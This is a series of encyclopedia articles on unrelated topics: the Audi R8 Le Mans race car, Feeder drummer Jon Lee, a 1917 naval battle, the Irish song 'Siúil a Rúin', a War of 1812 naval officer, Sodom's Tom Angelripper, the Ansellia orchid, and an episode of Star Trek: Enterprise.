<text>The Audi R8 is a Le Mans Prototype sports-prototype race car introduced in 2000 for sports car racing as a redevelopment of their Audi R8R (open-top LMP) and Audi R8C (closed-top LMGTP) used in 1999. In its class, it is one of the most successful racing sports cars having won the 24 Hours of Le Mans race in 2000, 2001, 2002, 2004, and 2005, five of the six years it competed in total. Its streak of Le Mans victories between 2000 and 2005 was broken only in 2003 by the Bentley Speed 8, another race car fielded that year by Volkswagen Group.

The petrol-powered Audi R8 race car was in 2006 replaced by the new Audi R10 TDI Diesel; however, the need to further develop the R10 meant that the R8 saw action in a few races leading up to the 24 Hours of Le Mans.

==History==

===1998: The challenge===
In 1997, sports car racing and especially the Le Mans 24 Hours was popular among factories such as BMW, Mercedes-Benz, Porsche, Toyota, Nissan Motors, and others. At that time, Audi Sport boss Wolfgang Ullrich started to evaluate the options of joining.

With the upcoming American Le Mans Series also providing a stage for the US market, Audi announced plans in 1998 to compete in 1999, with the Audi R8R powered by a V8 turbo. As it was considered the better choice for a whole race due to less weight and wider tires, Audi ordered an open-top roadster from Dallara to be developed and run by Joest Racing.

Yet, during the autumn of 1998, after the necessity of GT1 homologation was dropped in favour of LM-GTP prototypes, closed GT coupés like the Porsche 911 GT1, Mercedes-Benz CLK-GTR, and the Toyota GT-One proved successful. In response, Audi also ordered their newly acquired Norfolk-based Racing Technology Norfolk, led by Tony Southgate, to build a closed-cockpit car using the same drivetrain.

The ACO rules for closed-top prototypes allowed cars to run with larger air restrictors, resulting in more power (about 600 hp), which resulted in a higher top speed in combination with the lower drag. To compensate this advantage over the duration of a race, the LMGTPs were limited to smaller tyres and smaller fuel tanks.

===1999: The R8R and R8C===

Following a period of testing, two R8Rs debuted at the 1999 12 Hours of Sebring. The BMW V12 LMR won, which was a strong sign towards the race in France. The already tested open-top Audi R8R, entered by Joest Racing, was not fast enough to challenge for a win, finishing third.

After further tests and modifications, the Audis returned for Le Mans. The new debuting R8Cs lacked pace and unfortunately suffered mechanical gearbox woes. Lap times were 10 seconds down from the leading LMP and LMGTP competitors. Joest&#x27;s R8Rs ran steady, yet still were too slow to run for pole position. After a race that had the spectacular flights of the Mercedes-Benz CLR and leading cars of Toyota and BMW crashing out, the Audi R8Rs took third and fourth behind the surviving #15 BMW V12 LMR and the Japanese-driven Toyota.

Based on the experiences, Audi decided to regroup for 2000, and built a new R8 spyder together with Joest and Dallara. The British-built R8C coupe was retired, but Audi-owned Bentley developed the concept of the R8C closed-cockpit LMGTP and entered the Bentley EXP Speed 8 in 2001, winning the race with the Bentley Speed 8 in 2003.

===1999: Retiring competitors===
After the 1999 Le Mans shame, Mercedes retired from GTs to focus on the return of the DTM touring cars in 2000, as well as on F1. Toyota and BMW also went to F1, with BMW at least continuing to race for two years in the ALMS, where the open roadster of Bill Auberlen also suffered a &quot;back flip&quot; during the Petit Le Mans at Road Atlanta in 2000, as the closed-cockpit Porsche of Yannick Dalmas had done in 1998. Despite the BMW V12 LMR not receiving further development, the German team Schnitzer Motorsport was almost as effective as Joest. Still, the BMW V12 LMR could not match the Audi R8&#x27;s might in the championship and lost almost every race against it. BMW quit the top class to race the BMW M3 in the GT class since, dominating in the ALMS and in WTCC, as well as at the 24 Hours Nürburgring.

This left only Porsche as a major possible challenger for 2000; however, the Porsche LMP project was scrapped before it had a chance to race. Rumours at that time said that Ferdinand Piech himself made them stay away, using his influence as a co-owner of Porsche, as well as his management role at Volkswagen, which would develop the upcoming SUV VW Touareg in cooperation with the Porsche Cayenne. The Porsche V10 racer was turned into the Porsche Carrera GT instead.

===2000: The R8===


The Audi R8 is a sports-racing car prepared for the LMP900 class at Le Mans and in the American Le Mans Series. The car was developed by Audi Motorsport and Joest Racing, and debuted in 2000, winning the 12 Hours of Sebring.

The R8 won Le Mans five times (2000, 2001, 2002, 2004, and 2005) and the overall season championship in the American Le Mans Series six times in a row (from 2000 to 2005).

The R8 won a hat trick at Le Mans in 2000–2002, campaigned by Audi Sport Infineon Team Joest and driven by Tom Kristensen, Emanuele Pirro, and Frank Biela. First time out in 2000, the team won a 1-2-3 finish. Since then, the Audi R8 has won numerous championships and races, including further wins for &quot;privateer&quot; teams at Le Mans in 2004 and 2005.

The R8 is powered by a 3.6 L Audi V8 with Fuel Stratified Injection (FSI), which is a variation on the concept of gasoline direct injection developed by VW; it maximizes both power and fuel economy at the same time. FSI technology can be found in products available to the public, across all brands in the Volkswagen Group.

The power supplied by the R8, officially listed at about in 2000, 2001, and 2002, in 2003 and 2004, and in 2005, is sent to the rear wheels via a Ricardo six-speed sequential transmission with an electropneumatic paddle shift. Unofficially, the works team Audi R8 for Le Mans (2000, 2001, and 2002) is said to have had around instead of the quoted 610 hp. The numbers were quoted at speed, and were due to the car making 50 extra horsepower due to twin ram-air intakes at speeds over . Official torque numbers were quoted for this version of the engine at at 6500 rpm. The equation for horsepower (torque divided by 5250, multiplied by rpm) for these numbers produces a horsepower rating of at the same 6500 rpm (516/5250*6500=638). The Audi R8&#x27;s structure was designed from the beginning to expedite parts changes during the race. The car&#x27;s chassis has been likened to a Lego model — anything on the car can be changed and changed quickly. During its campaign, the Joest pit crew was able to change the entire rear transaxle of a damaged R8 — a process which usually takes between one and three hours — in as low as three minutes and 16 seconds. The reason for this was that the transmission, rear suspension, and rear subframe were built as one unit. The car had numerous quick-connect hoses and easily removable bolts. The whole rear section of the car could be removed as a whole and a new back half installed with the help of a crane. The Automobile Club de l&#x27;Ouest (ACO), organizers of the 24 Hours of Le Mans and the American Le Mans Series, acted quickly to void this advantage by mandating the gearbox casing be the same item through the duration of the race, with only the internals being allowed to be changed. However, the R8 still had quicker access to the gearbox internals than any other car due to its quick-change construction . This was critical as the gearbox was the weak link in the car.

The R8&#x27;s structure and body are both composed of carbon fibre, a strong, lightweight polymer material.

Performance from top speed to acceleration was, as in most race car cases, variable depending on the car&#x27;s setup. The highest speed of the R8 at Le Mans was in the practice sessions of the 2002 Le Mans 24 Hours Race. A low downforce setup could reach about .

Audi Sport&#x27;s program saw tragedy in 2001 when on April 25, popular ex-F1 driver Michele Alboreto died in an accident after suffering a high-speed tyre failure during an R8 test session at the Lausitzring in eastern Germany.

===2003: Bentley breaks the streak===
The Bentley Speed 8, which was somewhat based on the R8 ran at Le Mans from 2001 to 2003, winning in 2003, used a heavily modified 4.0-L version of the V8 engine from the Audi R8 .
The Bentley racing effort was campaigned by Team Bentley (Apex Motorsport) with assistance from longtime R8 competitor Joest Racing and Audi Sport UK. After 2002, the Joest factory team dropped its R8 campaign and left it to the privateers. Restrictor changes brought the power down to 550 bhp for anyone still racing with the R8, but the maximum torque hardly changed.
Tom Kristensen, who won the previous three 24 Hours of Le Mans races in an R8, was assigned to drive the Bentley Speed 8, and helped guide the team to victory. (Kristensen went on to win the 2004 and 2005 races in an Audi R8). Some similarity exists between the Bentley Speed 8 and the Audi R8&#x27;s successor, the R10 TDI.

===2005: End of active competition===
During the 2005 season, its time at the front of the pack evidently was drawing to a close. Audi had made the development of the Audi R10 TDI diesel public, and cars from other manufacturers and teams started to catch up in terms of on-the-track speed. The ACO still felt that the R8 needed to be kept in check, so they reduced the restrictor size on the R8&#x27;s engine, due to the car not meeting new hybrid regulations, and stipulated the car shall carry ballast weight in an attempt to make the races more competitive. The R8 was restricted even further to only 520 bhp. At the 2005 Le Mans, the Audis failed to qualify on pole position; the fastest R8 started the race in third position. However, the car was able to outlast all other competitors to eventually take its fifth checkered flag at the Circuit de la Sarthe and the 24 Hours of Le Mans. This victory was also notable since it was Tom Kristensen&#x27;s sixth straight 24 Hours of Le Mans victory, and a record seventh overall, beating legendary driver Jacky Ickx&#x27;s previous record of six career 24 Hours of Le Mans victories. To date, the R8 remains one of the fastest petrol-powered LMPs, setting a 3:29 at Le Mans, which was beaten only by the Lola-Aston Martins. However, the R8&#x27;s best finish was at 379 laps, which is more than the Lola-Aston Martin&#x27;s best at 373 laps.

==Legacy==

===2006: The R10 TDI===

In response to the new level of competition, Audi developed a successor known as the Audi R10 TDI. The V12 engined turbodiesel won at its race debut at the 2006 12 Hours of Sebring with both cars starting on the front row. However, the pole-sitting R10 had to start from the pit lane due to the need to rectify heat exchanger issues.

Emanuele Pirro, Frank Biela, and Marco Werner made history by becoming the first drivers to win the Le Mans 24-hour race in a diesel-powered car. The Audi R10 TDI completed a record 380 laps of the La Sarthe circuit, with Pirro at the wheel for the finish. French trio Sébastien Loeb, Éric Hélary, and Franck Montagny took second in the Pescarolo Judd No 17, four laps back. Scotsman Allan McNish was third in the other Audi, which came in 13 laps down after suffering mechanical problems.

The R8 continued to campaign the American Le Mans Series through the first half of the 2006 season, and made its final US appearance on July 1, 2006, at Lime Rock Park, Connecticut, piloted by McNish and Capello. The R8 ended its career in style by winning the race, marking the 50th American Le Mans Series victory for the Audi R8. The R10s participated in the rest of the ALMS season, beginning with the race at Miller Motorsports Park, Utah.

===2007: R8 road car===
The name Audi R8 also is used by the production road sports car Audi R8, which is based on the 2003 Audi Le Mans quattro concept car. Production started in 2007.

<text>Jonathan Henry Lee (28 March 1968 – 7 January 2002) was a Welsh drummer. He was the original drummer of the British rock band Feeder.

== Feeder and early career ==
Feeder were formed whilst Grant Nicholas was a producer, before moving to London to gain more experience. He had already met Lee in Newport who moved to London afterwards. They formed a band named Raindancer, who despite winning a TV slot on ITV Central never gained a record deal. Shortly before this, Lee was a member of Newport band The Darling Buds, although only appearing on a couple of b-sides of the &quot;Sure Thing&quot; single. Raindancer&#x27;s split saw bassist John Canham part ways with the band, before Simon Blight followed soon after when they reformed as Hum, which was changed to Reel, before then changing their name once again to Real when Taka Hirose took over bass duties in 1995. The band signed to The Echo Label in November 1994 before changing their name to Feeder, with their debut single proper &quot;Stereoworld&quot; reaching number 128 in the UK charts in October 1996, while the second single &quot;Tangerine&quot; reached number 60. The first full-length album, &quot;Polythene&quot;, was released in May 1997. Produced by Chris Sheldon, it charted at number 65 in the UK and was certified Silver for sales over 60,000 copies in 2003 when the band had already broken through. Metal Hammer magazine included it in its Top 20 Albums of 1997 list at number 1. It would later in mid 2017, upgrade to Gold status for 100,000 units.

The follow-up album, &quot;Yesterday Went Too Soon&quot;, was produced by Nicholas. Released in August 1999, the album was a much quicker commercial success than its predecessor (entering the UK album chart at number 8 and certified Silver in 2001, with this being upgraded to Gold in 2003). The title track was the band&#x27;s first UK Top 20 hit.

Two years later, the band released their third and also breakthrough album, &quot;Echo Park&quot;. Produced by Gil Norton (Foo Fighters, The Pixies, Echo &amp; the Bunnymen and James), the album peaked at number 5 in the UK and was also certified Gold, but in its release year, before going platinum in 2003. It contained their debut Top 10 single &quot;Buck Rogers&quot;.

After Lee&#x27;s death in 2002, the band kept out of the public eye until &quot;Comfort in Sound&quot; was nearing its completion. The first play of its lead single &quot;Come Back Around&quot;, was the first time since Lee&#x27;s death that the band made any public appearances and released new material. The single charted at #14, while the follow-up &quot;Just the Way I&#x27;m Feeling&quot; made the Top 10. The album, which was also produced by Norton, charting one place lower than &quot;Echo Park&quot; had, and later became their first platinum seller. The album featured Mark Richardson of Skunk Anansie on drums; he parted company with Feeder in 2009, to return to a reformed Skunk Anansie. An instrumental demo of &quot;Come Back Around&quot; was recorded before Lee&#x27;s death, with lyrics written later on by Nicholas. After his death, they were rewritten for the final version which Mark Richardson played on, keeping close to the original instrumental demo recording Lee made with the band.

== Death and aftermath ==

Lee died by suicide on 7 January 2002 at his home in Miami, Florida. His death was reported two days later on BBC Radio 1&#x27;s &quot;Newsbeat&quot; programme. It was later reported that four suicide notes were found.

Lee&#x27;s funeral took place at St. Mary&#x27;s Church in Newport on 18 January 2002, where thousands of fans showed up alongside family and friends to pay their own respects. Matt Page, Feeder&#x27;s manager, read &quot;Do Not Stand at My Grave and Weep&quot;, as requested by Lee&#x27;s father. Feeder&#x27;s 1997 single &quot;High&quot; was also played during the ceremony, during which Grant Nicholas gave the following statement:

Feeder decided to continue, with Nicholas saying, &quot;Jon would have wanted us to carry on.&quot; Former Skunk Anansie drummer Mark Richardson helped the band out on drum duties for their album &quot;Comfort in Sound&quot; and subsequent live performances.

The band&#x27;s first official live appearances after Lee&#x27;s death was at the Reading/Leeds Festivals, which saw Grant dedicate &quot;Quick Fade&quot; to &quot;absent friends&quot;. Thousands of fans turned up, with many being forced to watch outside as the tent went over capacity. The South Wales Argus noted the gig as a last ever opportunity for fans to collectively pay their final respects to Lee, having already earlier in the year been invited to attend Lee&#x27;s funeral. Feeder&#x27;s performance was given a positive review by the newspaper. &quot;Kerrang!&quot; would later give the band a perfect 5/5 score (KKKKK), for the same performance.

Earlier in the year, the band were invited by Melvin Benn, the owner of the festival to headline the first day of the main stage, having the year before played that stage fourth on the second day and attracting a large crowd, being the size normally seen with a headline act. The offer was soon refused as they did not want to play such a high-placed slot so soon after Lee&#x27;s death, so requested to play a much more low-key slot headlining the second stage.

In 2003, frontman Grant Nicholas dedicated the band&#x27;s win for &quot;Best British Band&quot; at the Kerrang! Awards to Lee, calling it the award he always wanted the band to win. In 2006, the band released a singles album, entitled &quot;The Singles&quot; in which Lee features on many of the album&#x27;s tracks. The album quickly became a platinum seller and the second album Lee appeared on to do so. During his lifetime Feeder had one silver album and one gold, meaning his achievement as a multi-platinum selling recording artist occurred posthumously.

Richardson was made the band&#x27;s permanent member for their fifth studio album &quot;Pushing the Senses&quot; in 2005. In 2006, an unreleased and incomplete 1998 recording named &quot;Uptight&quot; was released as a B-side on the &quot;Lost and Found&quot; single, with Grant Nicholas recording the track&#x27;s final vocals eight years after the initial 1998 recording. The song features Lee on drums and is to date the last released recording involving him.

Richardson left Feeder in 2009 to return to a reformed Skunk Anansie, before Karl Brazil took over the drums. Nicholas later claimed that the chemistry he feels between himself and Brazil is very much the same way that he felt with Lee. Feeder&#x27;s 2012 album &quot;Generation Freakshow&quot; features the track &quot;Hey Johnny&quot; which is written in dedication to Lee. In 2017, Lee would make a posthumous return to the top 10 of the UK Albums Chart, when &quot;The Best of Feeder&quot; charted at number 10 in October of that year.

As a past member of Feeder, Lee was posthumously inducted into the &quot;Kerrang! Hall of Fame&quot; on 9 August 2019.

<text>The Second Battle of Dover Strait was a naval battle of the First World War, fought in the Dover Strait in April 1917 and should not be confused with the major Battle of Dover Strait in 1916. Two Royal Navy destroyers defeated a superior force of German &quot;Kaiserliche Marine&quot; torpedo boats. &lt;ref name= &quot;http://www.naval-history.net/WW1NavyBritishDestroyers.htm&quot;&gt;&lt;/ref&gt; Two German torpedo boats were sunk; the British suffered damage to both destroyers.

==Background==
On 20 April 1917, two groups of torpedo boats of the German Navy raided the Dover Strait to bombard Allied positions on shore and to engage warships patrolling the Dover Barrage— the field of floating mines that prevented German ships from getting into the English Channel. Six torpedo boats bombarded Calais and another six bombarded Dover just before midnight.

==Battle==
Two flotilla leaders of the Royal Navy — and — were on patrol near Dover and engaged six of the German ships early on 21 April near the Goodwin Sands. In a confusing action, &quot;Swift&quot; torpedoed . &quot;Broke&quot; rammed , and the two ships became locked together. For a while, there was close-quarters fighting between the crews, as the German sailors tried to board the British ship, before &quot;Broke&quot; got free and &quot;G42&quot; sank.

==Aftermath==
HMS &quot;Swift&quot; was slightly damaged, but &quot;Broke&quot; was heavily damaged and had to be towed back to port.

<text>&quot;Siúil a Rúin&quot; (Roud 911) is a traditional Irish song, sung from the point of view of a woman lamenting a lover who has embarked on a military career, and indicating her willingness to support him. The song has English language verses and an Irish language chorus, a style known as macaronic.

The title () translates to &quot;go, my love&quot; (or variants): &quot;siúil&quot; is an imperative, literally translating to &quot;walk!&quot;, &quot;a rúin&quot; is a term of endearment.

==History==
The history of the song is unclear. It has been suggested that the song refers to the &quot;Wild Geese&quot; of the Glorious Revolution. If it does, however, the original version has probably been lost. It is not uncommon that Irish songs were translated into English, with their chorus surviving in Irish, or being transformed into nonsense words (see Caleno custure me), but in most of these cases, some of the Irish version still survives. It is possible that the song was composed in the 1800s with the conscious intention of styling it after older songs.

As is common in folk music, many lyrical variants of the song exist.

Robert Louis Stevenson refers to the song twice in his novel The Master of Ballantrae (1889). Referred to as &quot;the pathetic air of &#x27;Shule Aroon&#x27;&quot;, it is whistled by the Irish Jacobite exile Francis Burke and later sung by the Master of Ballantrae himself to impress his younger brother&#x27;s wife. The Master describes it as &quot;very moving&quot; and describes it being sung by Jacobite exiles in France: &quot;it is a pathetic sight when a score of rough Irish ... get to this song; and you may see, by their falling tears, how it strikes home to them&quot;.

In &quot;Ulysses&quot;, James Joyce had Stephen Dedalus sing the song to Leopold Bloom in Bloom&#x27;s kitchen (as part of the Ithaca episode). The song can be seen to signal or echo many of the grand themes of the book, referencing loss of language, usurpation, betrayal, loss of leadership and women selling themselves. Bloom responds by singing a song in Hebrew.

&quot;Johnny Has Gone for a Soldier&quot;/&quot;Buttermilk Hill&quot; is a well-known American variant dating to the Revolutionary War, sharing a common melody and similar lyrics.

==Modern performance==

Folklorist and ethnomusicologist Alan Lomax recorded Elizabeth Cronin singing &quot;Siúil a Rúin&quot; (&quot;Shule Agra&quot;, literally &quot;Walk, O Love&quot;) in the early 1950s, and both the lyrics and the tune of her version are seemingly the foundation of most subsequent recordings, including those of Clannad and Celtic Woman. Her performance can be heard online via the Alan Lomax archive.

&quot;Siúil a Rúin&quot; is one of the most widely sung songs in the Irish repertoire. Well-known performances are by Clannad from their album &quot;Dúlamán&quot; and Mary Black on different occasions, e.g. on the BBC&#x27;s &quot;The Highland Sessions&quot; or with Altan on &quot;Altan Beo – 21 Bliain ag Ceol&quot;.

Recordings include Nita Conley Korn and Eileen Estes on their album &quot;The Apple Tree Project,&quot; Scantily Plaid on their album, &quot;Just Checking In&quot;, Édain on &quot;JOYceFUL&quot;, Éilís Kennedy on &quot;One Sweet Kiss&quot;, Tríona Ní Dhomhnaill on Donal Lunny&#x27;s Coolfin, Allison Barber on &quot;Traveling Home&quot;, Órla Fallon from Celtic Woman on the album of the same name, Lisa Kelly (who was also with Celtic Woman) on &quot;Lisa&quot;, Ciúnas on &quot;Celtic Tiger&quot;, Aoife Ní Fhearraigh on &quot;If I Told You&quot;, Maighréad Ní Dhomhnaill &amp; Iarla Ó Lionáird on &quot;Sult&quot;, Anúna on &quot;Invocation&quot; with Lucy Champion, Connie Dover on &quot;The Wishing Well&quot;, Akelarre Agrocelta on &quot;La Amenaza Celta&quot;, Nora Butler on &quot;Geantraí&quot; and Siobhan Owen on &quot;Purely Celtic&quot;.

The song has also been recorded by Kate Price, Lintie, Acabella, Anam, The Irish Group, Caoilte Ó Súilleabháin, Nollaig Casey, Kate Crossan, Carmel Gunning, Rosheen, Sissel Kyrkjebo with the Chieftains, Sarah English, Janette Geri, and Bruadar. &quot;Siúil a Rúin&quot; is one of the songs in Flatley&#x27;s Lord of the Dance. Versions of &quot;Buttermilk Hill&quot; have been performed by The Black Country Three, Dan Gibson, Alisa Jones, Julie Felix, Judy Collins, Noah Saterstrom and The Weavers.

A recognisable version of this song was recorded by Peter, Paul, and Mary entitled &quot;Gone The Rainbow&quot;. It was on the B-side of &quot;The Hammer Song&quot;.

In the 2022 documentary film North Circular, the song is performed live from the back room of The Cobblestone Pub in Smithfield in Dublin by Julie Kavanagh, a singer formerly of the band Twin-Headed Wolf.

On April 25, 2022, a Ukrainian YouTube-singer Eileen published an adapted version &quot;Йди, коханий мій&quot; (literally &quot;Walk My Love&quot;) on her channel. This version resonates with the strengthening of the Russian offensive in 2022 during the Russo-Ukrainian war.

<text>Captain Edward R. McCall (5 August 1790 – 1 August 1853) was an officer in the United States Navy during the War of 1812. He was awarded a Congressional Gold Medal.

==Biography==
Born in South Carolina, McCall was appointed midshipman 1 January 1808. Appointed acting lieutenant in brig &quot;Enterprise&quot; 16 October 1811, he took command of his ship during her action with HMS &quot;Boxer&quot; 5 September 1813, early in which &quot;Enterprise&#x27;s&quot; captain, Lieutenant William Ward Burrows II, was mortally wounded. In acknowledgment of his victory over &quot;Boxer&quot;, McCall received the Thanks of Congress and a Congressional Gold Medal.

Promoted to captain 3 March 1835, he died at his home in Bordentown, New Jersey, 1 August 1853.

Two ships have been named USS &quot;McCall&quot; for him.

<text>Thomas Such (born 19 February 1963), known professionally as Tom Angelripper, is a German musician. He is the lead vocalist, bassist, main songwriter and only original remaining member of the thrash metal band Sodom and also a member of the bass guitar-focused side project Bassinvaders. He has also released solo albums under the name Onkel Tom.

==Biography==

Thomas Such was born in Gelsenkirchen on 19 February 1963, from where he learned to play bass steadily whilst working in coal mines. He then went on, as Tom Angelripper, to be one of the founding members of the German thrash metal band Sodom. He originally started off as just the bassist, but ended up becoming the vocalist and has done both on every studio release.

In Sodom, Angelripper plays bass and sings. Angelripper formed Sodom with guitarist Frank &quot;Aggressor&quot; Testegen and drummer Rainer &quot;Bloody Monster&quot; Focke in 1982, in a desperate bid to get out of work in the coal mines that the three had worked in.

Angelripper also founded a band called Onkel Tom Angelripper which plays metal versions of schlagers, drinking songs and Christmas carols. In addition, he worked with a side project of Sodom&#x27;s touring guitarist Alex Kraft, called Desperados, which played spaghetti Western-themed heavy metal. The band later evolved independently under the name of Dezperadoz, but Angelripper still occasionally contributes.

He also plays in several other side projects, such as the German bands Bassinvaders and Die Knappen and has just guested on the brand new Warfare single the first for 27 years Cemetery Dirt (Plastic Head Music Download)

<doc id="1341127" wikidata="Q9385262" url="?curid=1341127" title="Ansellia">
<text>Ansellia is considered a monotypic genus of orchid, with only one species, Ansellia africana, commonly known as African ansellia or leopard orchid, however, it may in fact be a complex group of species which share common floral structure and growth habit.

The plants are found throughout tropical and subtropical Africa. It was named after John Ansell, an English assistant botanist. who found the first specimens in 1841 on the Fernando Po Island in West Africa. This genus is sometimes abbreviated as Ansel or Aslla in horticultural trade.

It is referred to along with &quot;Grammatophyllum&quot; as a &quot;trash basket&quot; orchid due to its habit of creating a makeshift container of aerial roots to catch falling leaf litter for nutrients.

== Distribution and habitat ==
This orchid is native to tropical and southern Africa, found alongside coasts and rivers in the canopy of trees, usually at elevations lower than 700 m (occasionally up to 2,200 m).

== Description ==
This is a large, perennial, and epiphyte, or at times a terrestrial plant, growing in sometimes spectacular clumps, attached to the branches of tall trees. The white, needle-like, aerial roots are characteristic for this orchid. They point upwards, taking the form of a basket around the tall, many-noded, fusiform, canelike, yellow pseudobulbs, catching the decaying leaves and detritus upon which the plant feeds. These pseudobulbs can develop a gigantic size, up to 60 cm long. This robust orchid can grow very large, sometimes with an estimated weight over a tonne. Even eagle owls (&quot;Bubo bubo&quot;) have been seen to make their nest in such a clump.

The roots which penetrate the substrate can become very thick and cord-like to support the weight of the plants, and are typically very different in form than the roots which comprise the &quot;trash basket&quot; as the aerial roots are non-absorbing. Breakdown and absorption of nutrients by the plant from the trash basket is performed by its fungal symbionts and the active absorbing roots.

These pseudobulbs carry on their top 6 to 7, narrowly ligulate-lanceolate, acute, plicate, leathery leaves. They give rise to a paniculate inflorescence, up to 85 cm long, with many (10 to 100), delicately scented flowers, 6 cm across.

The three-lobed lip grows into three yellow projections. The tepals are yellow or greenish yellow, lightly or heavily marked with brown spots. The flowers are short-lived, seldom lasting longer than 10 days, but are produced in abundance provided the plants have received high light levels throughout the year.

== Cultivation ==
An easy species to grow, in cultivation the plants usually bloom with a terminal inflorescence from the older pseudobulbs, some plants however, will produce flowers from newer pseudobulbs in odd years. These plants are shy to flower in cultivation unless they receive very bright light of around 2000 foot candles and given a dry rest for about 6 weeks in the fall. In habitat, the plants can go periods of several months without water, and are very drought tolerant, but the plants tend to perform better if kept evenly moist throughout the year. Plants which are receiving enough light will take on a yellowish coloration in the leaves. This is normal as these plants use CAM photosynthesis. Plants with very green leaves are not receiving enough light.

The plants are fungal magnets in habitat and in cultivation and tend to culture mychorrhizal fungi they pick up from their environment since this species is a trash basket orchid that in nature creates a network of interlocked airborne roots to collect leaf litter, they have a tendency to rapidly break down their growing medium more so than other species of orchids. Unlike most epiphytic orchids, the roots of this species are not appreciably photosynthetic, are white and pale, and resemble the roots of terrestrial and mycoheterotrophic orchids.

When the plants are not getting enough nitrogen, they will start growing a trash basket with numerous non-absorbing roots growing upwards. These plants do not produce a trash basket if they are receiving sufficient nitrogen regularly.

These plants in habitat usually bloom at the end of dry spells, however, this species has a unique habit of blooming at any time of the year and several times a year if the plants have been grown in high light levels and are subjected to short dry spells of 4–6 weeks every 6 months. There is wide variability of flower shape, color, and markings, and this species is widespread across Africa.

<doc id="1341129" wikidata="Q2402314" url="?curid=1341129" title="A Night in Sickbay">
<text>&quot;A Night In Sickbay&quot; is the thirty-first episode of the American science fiction television series &quot;Star Trek: Enterprise&quot;, the fifth episode of season two. It first aired on October 16, 2002, on UPN within the United States. The episode was written by executive producers Brannon Braga and Rick Berman, and directed by David Straiton.

Set in the 22nd century, the series follows the adventures of the first deep space Starfleet starship &quot;Enterprise&quot;, registration NX-01. In this episode, after visiting the planet Kreetassa, Captain Archer&#x27;s (Scott Bakula) dog Porthos falls ill with an unknown pathogen. Archer stays overnight in sickbay to look after his dog with Doctor Phlox (John Billingsley), knowing that afterwards he must take part in an elaborate apology display to the Kreetassans.

The episode featured Vaughn Armstrong, who reprised his role of the Kreetassan Captain from the episode &quot;Vox Sola&quot;. Several scenes also proved challenging for the main dog actor who portrayed Porthos, who was named Breezy. She was required to lie still for long periods, jump into Bakula&#x27;s arms on command, and also act on her own while her trainer was not on set. Berman compared the relationship between Archer and Phlox to &quot;The Odd Couple&quot;, saying that the episode was &quot;a lot of fun&quot;. The episode was nominated for the 2003 Hugo Award for Best Dramatic Presentation (short form) and received the highest Nielsen ratings for any episode of &quot;Enterprise&quot; during season two at that point. Critical reception at the time was mixed, and in retrospect reviews were more negative.

==Plot==
After a five-day away mission spent apologising on the planet Kreetassa, the away team consisting of Captain Archer, Sub-Commander T&#x27;Pol, Ensign Sato, and Archer&#x27;s dog, Porthos, return to the ship to decontaminate. Porthos has acquired a pathogen on the planet surface and must be quarantined. Archer learns from Commander Tucker of the ship&#x27;s need for an extra plasma injector from the Kreetassans, but negotiations break down after it is discovered that Porthos had urinated on a sacred tree, insulting the Kreetassans. Archer reacts poorly to the news and is given a list of requirements he must meet in order to apologise.

He and Doctor Phlox then tend to Porthos, and Archer spends the night in Sickbay to be with his pet. Throughout the night, as Porthos&#x27; immune system weakens, Archer experiences Phlox&#x27;s side of life in Sickbay. During the night, as he dreams of Porthos&#x27; funeral, Archer also deals with unresolved and suppressed sexual tension with T&#x27;Pol. He also relates to Phlox how he met Porthos, and how he was the last in a litter of four male puppies, the &#x27;Four Musketeers&#x27;. Through it all, Archer struggles to reach an emotional understanding with Phlox and T&#x27;Pol, as the two alien senior-crew members have little grasp of the human-pet relationship, and Phlox keeps offering Archer unsolicited advice about dealing with his apparent feelings for T&#x27;Pol.

T&#x27;Pol, working out in the gym, also keeps urging Archer to apologize to the Kreetassans for Porthos&#x27; behavior, but Archer resists because he blames them for Porthos&#x27; illness. In the end, Porthos recovers following a pituitary transplant from an alien chameleon. Finally swallowing his pride, Archer then goes down to the Kreetassan capital and delivers an intricate ritual apology which involves slicing a tree trunk with a chainsaw, arranging the pieces of wood in a complex pattern on the ground, and chanting phrases in the Kreetassan language. Having successfully apologised to the Kreetassans, the crew finally manage to procure three plasma injectors prior to their departure.

==Production==
Executive producers Rick Berman and Brannon Braga had worked together to write a series of episodes for &quot;Star Trek: Enterprise&quot;, with &quot;A Night in Sickbay&quot; amongst them. Berman originally described the episode at a press junket when talking about season two at an event held by UPN for the Television Critics Association. He said it was a &quot;very humorous episode that has our good captain going and spending some time in sickbay, because his dog gets sick. He moves into sickbay the same way a mother will move into the hospital when her child gets sick, and it ends up being an &#x27;&quot;Odd Couple&quot;&#x27; kind of an episode between the captain and Dr. Phlox. It&#x27;s a lot of fun.&quot; Bakula also explained in an interview with the website TrekWeb that the episode featured Archer&#x27;s dog Porthos as a background character, and that it was also about Archer spending a night in sickbay with Phlox. He said that this meant that the viewer will &quot;find out a lot of stuff about [Phlox] that we may not have wanted to know; like what he does when he&#x27;s in his off hours... he has things to cut and trim!&quot; Billingsley said later that he enjoyed working with Bakula on this episode, and called &quot;A Night in Sickbay&quot; one of his favourites.

The episode was directed by David Straiton, who had previously directed &quot;Desert Crossing&quot;. The shoot took six and a half days, which concluded on August 8, 2002. &quot;A Night in Sickbay&quot; was intended to be a low-cost episode as the majority of scenes required only the use of the standing sets for the series. The only credited guest star in &quot;A Night in Sickbay&quot; was Vaughn Armstrong, who played the Kreetassan captain once again. Armstrong is better known for his recurring role in &quot;Enterprise&quot; as Admiral Maxwell Forrest, but had previously played the Kreetassan captain in the first season episode &quot;Vox Sola&quot;. In order to appear as the captain, some three and a half hours of make-up time was required, with the actor needed to arrive to have his make-up applied at 5:30am for his one day of shooting. Armstrong appeared in a variety of different roles in several different &quot;Star Trek&quot; programs, dating back to the &quot;Star Trek: The Next Generation&quot; season one episode &quot;Heart of Glory&quot;. Other make-up effects during this instalment of &quot;Enterprise&quot; included a pair of prosthetic feet for Dr. Phlox, although other effects for the character were added in post-production.

===Porthos===

There were two Beagles portraying Porthos, who were supplied by Performing Animal Troupe, an animal supply company for film and television. These dogs included a female Beagle called Breezy, who was the main dog actor who played Porthos during season two. A second dog called Windy provided backup to Breezy. Breezy was the original double for male dog actor Prada who appeared in the first-season episodes of &quot;Enterprise&quot; up until &quot;Two Days and Two Nights&quot;, when Breezy became the main dog. She had also previously appeared as Lou in the 2001 film &quot;Cats &amp; Dogs&quot;.

